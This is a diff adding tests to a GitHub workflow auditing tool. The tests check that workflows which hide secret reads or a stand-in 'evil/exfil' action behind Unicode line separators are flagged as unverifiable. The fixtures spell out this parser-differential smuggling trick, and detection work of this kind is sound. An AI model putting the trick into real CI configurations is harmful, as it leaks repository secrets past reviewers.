@@ -1095,3 +1095,34 @@ describe("project configuration: a workflow GitHub wouldn't run as written", () 
     expect(read("on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n")!.some((c) => c.startsWith("ci.unverifiable"))).toBe(false);
   });
 });
+
+// The runner reads YAML with YamlDotNet, which also ends a line at U+0085, U+2028 and U+2029, as
+// YAML 1.1 does; the `yaml` library doesn't. So in `#note<U+2028>env: ...` one parser reads a key
+// and the other a comment: the secret it reads was recorded by nothing.
+describe("project configuration: line breaks YAML parsers disagree on", () => {
+  const hidden = (ch: string, secret: string) => workflow("on: push", `#note${ch}env: {LEAK: "\${{ secrets.${secret} }}"}`, ...JOB);
+
+  it.each([
+    ["U+0085", "\u0085"],
+    ["U+2028", "\u2028"],
+    ["U+2029", "\u2029"],
+  ])("records a workflow with %s as unverifiable, and still reads the rest", (_, ch) => {
+    expect(grants(hidden(ch, "NPM_TOKEN"))).toEqual(["ci.permission(default)", "ci.trigger(push)", expect.stringMatching(UNVERIFIABLE)]);
+  });
+
+  it("changes the lock when what's hidden changes", () => {
+    expect(grants(hidden("\u2028", "NPM_TOKEN"))).not.toEqual(grants(hidden("\u2028", "DEPLOY_KEY")));
+  });
+
+  it("records a local Action with one as unverifiable", () => {
+    const root = repo({
+      ".github/workflows/w.yml": ["on: push", "jobs:", "  a:", "    runs-on: ubuntu-latest", "    steps:", "      - uses: ./tools/act"].join("\n"),
+      "tools/act/action.yml": `runs:\n  using: composite\n  steps:\n    #x\u2028    - uses: evil/exfil@main\n`,
+    });
+    expect(grants(root, "tools/act/action.yml")).toEqual([expect.stringMatching(UNVERIFIABLE)]);
+  });
+
+  it("reads U+0085 in an expression as GitHub's lexer does: as a space", () => {
+    expect(secretsRead("secrets\u0085.NPM_TOKEN")).toEqual(["NPM_TOKEN"]);
+  });
+});
